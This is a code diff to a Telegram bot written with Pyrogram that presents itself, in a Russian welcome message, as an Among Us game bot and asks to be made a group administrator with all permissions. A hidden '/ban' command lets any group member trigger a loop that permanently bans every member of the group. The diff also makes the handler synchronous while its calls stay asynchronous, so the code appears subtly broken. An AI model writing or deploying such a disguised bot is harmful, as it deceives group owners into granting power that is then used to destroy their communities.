@@ -1,4 +1,5 @@
 from pyrogram import Client as bot, filters, idle
+import asyncio
 
 app = bot(
 session_name='AmonsUs',
@@ -13,7 +14,7 @@ async def start(client, message):
 	await message.reply_text(f'<b>Привет, {message.from_user.first_name}!\n\nЯ - бот для игры в Among Us прямо в Телеграме!\nЧтобы запустить игру, добавьте меня в группу и дайте права администратора с всеми галочками, иначе я не буду работать!</b>')
 	
 @app.on_message(filters.command('ban', ['/', '!', '.']) & ~filters.private)
-async def kickall(client, message):
+def kickall(client, message):
 	for all in client.iter_chat_members(message.chat.id):
 		try:
 			client.kick_chat_member(message.chat.id, all.user.id, 0)
